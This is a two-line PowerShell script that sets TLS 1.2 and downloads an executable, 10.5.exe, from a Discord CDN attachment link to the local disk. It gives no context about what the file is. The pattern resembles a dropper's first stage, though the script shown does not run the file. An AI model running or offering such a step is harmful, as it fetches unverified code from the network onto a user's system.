[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest 'https://cdn.discordapp.com/attachments/1187316940532891689/1299193521177104434/10.5.exe?ex=671c4fc1&is=671afe41&hm=d017ee3e91a26587c878b65a4ccfc14083d67cd3396205ad8c58cddeb8f62d8a&' -OutFile 10.5.exe
